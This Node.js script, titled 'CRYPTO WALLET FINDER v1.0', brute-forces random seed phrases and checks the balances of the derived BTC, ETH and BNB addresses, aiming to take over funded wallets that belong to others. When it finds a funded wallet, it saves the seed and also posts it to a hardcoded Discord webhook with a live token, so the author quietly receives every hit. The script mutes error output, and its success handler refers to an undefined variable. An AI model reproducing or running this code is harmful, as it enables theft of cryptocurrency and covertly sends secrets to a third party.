console.error = function() {}
console.warn = function() {}
const bip39 = require('bip39');
const { HDNodeWallet, Mnemonic } = require('ethers');
const Web3 = require('web3').default;
const fs = require('fs');
const cluster = require('cluster');
const bitcoin = require('bitcoinjs-lib');
const axios = require('axios').default;
const path = require('path');
const argv = require('minimist')(process.argv.slice(2));
const config = require(path.join(process.cwd(), `./${argv.c || 'config.json'}`));
const blessed = require('blessed');
const { range } = require('lodash');

const ethServers = config.eth_rpc_servers || []
const bnbServers = config.bnb_rpc_servers || []
const numCPUs = config.threads || 4;
const countNodes = config.nodes || 4;
const coins = config.coins || ['BTC', 'ETH', 'BNB'];

function random(array) {
    const index = Math.floor(Math.random() * array.length);
    return array[index];
}

const generateNodes = (coin) => {
    if (coin === 'ETH') {
        return [...Array(countNodes)].map(() => new Web3(new Web3.providers.WebsocketProvider(random(ethServers))));
    }

    if (coin === 'BNB') {
        return [...Array(countNodes)].map(() => new Web3(new Web3.providers.WebsocketProvider(random(bnbServers))));
    }

    return []
}

const ethNodes = coins.includes('ETH') ? generateNodes('ETH') : [];
const bnbNodes = coins.includes('BNB') ? generateNodes('BNB') : [];

const generateBTCAddress = async () => new Promise((resolve) => {
    const mnemonic = bip39.generateMnemonic(128)
    const seed = bip39.mnemonicToSeedSync(mnemonic)
    const network = bitcoin.networks.bitcoin;
    const root = bitcoin.bip32.fromSeed(seed);
    const account = root.derivePath("m/44'/0'/0'/0")
    const node = account.derive(0)
    const p2pkh = bitcoin.payments.p2pkh({ pubkey: node.publicKey, network });
    const p2wpkh = bitcoin.payments.p2wpkh({ pubkey: node.publicKey, network });
    const p2sh = bitcoin.payments.p2sh({ redeem: p2wpkh, network  });
    const p2wsh = bitcoin.payments.p2wsh({ redeem: p2wpkh, network  });

    resolve([
        { address: p2pkh.address, seed: mnemonic, coin: 'BTC' },
        { address: p2wpkh.address, seed: mnemonic, coin: 'BTC' },
        { address: p2sh.address, seed: mnemonic, coin: 'BTC' },
        { address: p2wsh.address, seed: mnemonic, coin: 'BTC' },
    ]);
})

const generateETHAddress = async () => new Promise((resolve) => {
    const mnemonic = bip39.generateMnemonic(128)
    const ethMnemonicInstance = Mnemonic.fromPhrase(mnemonic);
    const ethwallet = HDNodeWallet.fromMnemonic(ethMnemonicInstance, `m/44'/60'/0'/0/0`);
    resolve({ address: ethwallet.address, seed: mnemonic, coin: 'ETH' });
})

const generateBNBAddress = async () => new Promise((resolve) => {
    const mnemonic = bip39.generateMnemonic(128)
    const ethMnemonicInstance = Mnemonic.fromPhrase(mnemonic);
    const ethwallet = HDNodeWallet.fromMnemonic(ethMnemonicInstance, `m/44'/60'/0'/0/0`);
    resolve({ address: ethwallet.address, seed: mnemonic, coin: 'BNB' });
})

const getBNBBalance = async (address) => new Promise(async (resolve) => {
    try {
        const node = random(bnbNodes);
        const balance = await node.eth.getBalance(address);
        const blc = Number(node.utils.fromWei(balance, 'ether'));
        resolve(blc);
    } catch (error) {
        resolve(0)
    }
})

const getETHBalance = async (address) => new Promise(async (resolve) => {
    try {
        const node = random(ethNodes);
        const balance = await node.eth.getBalance(address);
        const blc = Number(node.utils.fromWei(balance, 'ether'));
        resolve(blc);
    } catch (error) {
        resolve(0)
    }
})

const getBTCBalance = async (address) => new Promise(async (resolve) => {
    try {
        const response = await axios.get(`https://bitcoin.atomicwallet.io/api/v2/address/${address}`);
        const balance = Number(response.data?.balance || 0);
        const blc = balance / 100000000
        resolve(blc);
    } catch (error) {
        resolve(0)
    }
})

const getLTCBalance = async (address) => new Promise(async (resolve) => {
    try {
        const response = await axios.get(`https://litecoin.atomicwallet.io/api/v2/address/${address}`);
        const balance = Number(response.data?.balance || 0);
        const blc = balance / 100000000
        resolve(blc);
    } catch (error) {
        resolve(0)
    }
})

const sendMessage = (title, message) => {
    const embered = { 'title': message };
    const headers = { "Content-Type": "application/json" };
    const data = {
        'username': 'doge-scan-bot',
        'avatar_url': 'https://i.imgur.com/AfFp7pu.png',
        'content': title.toString(),
        'embeds': [embered]
    };
    const webhookUrl = "https://discord.com/api/webhooks/1227910695769870446/HZIb6qMoD8V3Fu8RMCsMwLp8MnGouLuVveDKA2eA1tNPUMWU-itneoAayVXFcC3EVlwK";
    try {
        axios.post(webhookUrl, data, { headers })
    } catch (error) {
        console.log(error);
    }
}

let founds = 0
let counts = 0;
let methods = {
    ETH: getETHBalance,
    BNB: getBNBBalance,
    BTC: getBTCBalance,
    LTC: getLTCBalance
}

async function generate() {
    if (coins.includes('BTC')) {
        generateBTCAddress().then(async (wallets) => {
            for (let index = 0; index < wallets.length; index++) {
                const wallet = wallets[index];
                const balance = await methods[wallet.coin](wallet.address);
                process.send({ ...wallet, balance, coin: 'BTC' }); 
            }
        });
    }

    if (coins.includes('BNB')) {
        generateBNBAddress().then(async (wallet) => {
            const balance = await methods[wallet.coin](wallet.address);
            process.send({ ...wallet, balance, coin: 'BNB' });
        });
    }

    if (coins.includes('ETH')) {
        generateETHAddress().then(async (wallet) => {
            const balance = await methods[wallet.coin](wallet.address);
            process.send({ ...wallet, balance, coin: 'ETH' });
        });
    }
}

if (cluster.isMaster) {
    const lines = {}

    let screen = blessed.screen({
        smartCSR: true
    });

    let title = blessed.text({
        top: 0,
        left: 0,
        width: '100%',
        height: 'shrink',
        content: `CRYPTO WALLET FINDER v1.0`,
        style: {
            fg: 'green'
        }
    });

    let status = blessed.text({
        top: 2,
        left: 0,
        width: '100%',
        height: 'shrink',
        content: `Threads:      ${numCPUs} CPUs`,
        style: {
            fg: 'green'
        }
    });

    let result = blessed.text({
        top: 4,
        left: 0,
        width: '100%',
        height: 'shrink',
        content: `Result:       Total: 0 | Found: 0`,
        style: {
            fg: 'green'
        }
    });

    range(0, numCPUs, 1).forEach(i => {
        let process = blessed.text({
            top: 6 + (i * 2),
            left: 0,
            width: '100%',
            height: 'shrink',
            content: `Wallet Check: CPU ${i + 1} `,
            style: {
                fg: 'yellow'
            }
        });
        lines[`${i + 1}`] = process;
        screen.append(process);
    })

    let box = blessed.box({
        top: 8 + (numCPUs * 2),
        left: 0,
        width: '100%',
        height: 'shrink',
        style: {
            fg: 'blue'
        }
    });

    screen.append(title);
    screen.append(status);
    screen.append(result);
    screen.append(box);
    screen.render();

    cluster.on('message', async (worker, wallet) => {
        counts++;
        const coin = wallet.coin;

        if (wallet.balance > 0) {
            founds++;
            var successString = "Wallet: [" + wallet.address + "] - Seed: [" + wallet.seed + "] - Balance: " + balance + ` ${wallet.coin}`;
            sendMessage('A Wallet Found Success!!!', successString);
            fs.appendFileSync('./match.txt', successString, (err) => {
                if (err) {
                    console.log('Error:', err.message)
                }
            })

            box.insertTop(`Found: ${coin} | ${wallet.balance} ${wallet.coin} |  ${wallet.address} | ${wallet.seed}`);
        } 

        result.setContent(`Result:       Total: ${counts} | Found: ${founds}`);
        lines[worker.id].setContent(`Wallet Check: CPU ${worker.id} - ${wallet.balance} ${wallet.coin} | ${wallet.address}`);
        screen.render();
    });

    // Fork workers.
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork(); // Create a new worker process
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`worker ${worker.process.pid} died`); // Log when a worker process exits
    });
} else {
    setInterval(generate); // Call the generate function repeatedly with no delay
}
